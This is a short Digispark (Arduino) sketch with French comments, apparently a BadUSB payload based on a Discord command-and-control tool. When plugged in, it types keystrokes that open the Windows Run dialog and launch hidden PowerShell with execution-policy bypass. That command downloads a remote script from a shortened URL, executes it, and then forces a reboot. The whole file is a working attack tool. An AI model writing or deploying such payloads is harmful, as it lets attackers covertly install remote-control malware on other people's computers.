[span_1](start_span)// Base: benzoXdev's Discord Command And Control[span_1](end_span)
// Modifié pour compatibilité universelle et redémarrage forcé

#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  // Attente pour l'initialisation du pilote USB
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);

  // Étape 1 : Win+R pour ouvrir l'exécuteur (Universel)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);

  // Étape 2 : Commande optimisée
  // On passe par 'cmd' d'abord car 'powershell' peut varier selon les versions
  // La commande télécharge le script PS1 via l'URL et programme le reboot
  // 'shutdown -r -t 60' (r = restart, t = 60 secondes)
  DigiKeyboard.print("powershell -NoP -Ep Bypass -W H -C \"irm https://is.gd/bwdcc2 | iex; shutdown -r -t 60\"");
  
  // Exécution
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Pause infinie : Une fois la touche Entrée pressée, 
  // tu peux débrancher le Digispark, le processus Windows est lancé.
  for(;;){ /* Stop */ }
}
